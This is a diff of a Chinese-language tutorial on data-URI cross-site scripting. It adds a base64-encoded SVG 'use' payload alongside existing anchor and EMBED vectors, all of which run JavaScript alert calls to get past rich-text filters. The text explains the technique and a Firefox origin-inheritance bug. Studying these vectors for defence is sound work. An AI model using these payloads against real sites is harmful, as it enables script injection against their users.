@@ -125,6 +125,10 @@ data uri在xss领域最常见的应用就是前面提到过的用来绕过富文
 	<a src="data:text/html;,<script>alert(document.domain)</script>">test</a>
 	<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ2ZyZWVidWYuY29tJyk7PC9zY3JpcHQ+PC9zdmc+" AllowScriptAccess="always"></EMBED>
 
+		<svg> 
+	<use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle" /> 
+	</svg>
+
 a标签和embed标签都可以，前面提到说是用url制定外部资源的地方都可以用data uri来指定。那么外部资源类型为html等可以执行js的地方，都可以用来进行data uri xss。
 
 让我吃惊的是firefox在点击a标签的链接时候，执行的js依然继承了来源域。关于firefox这个问题，早在04年就有人给firefox报过bug，不过时至今日。我们看到的就是我们现在看到的样子。。。（参考资料3）
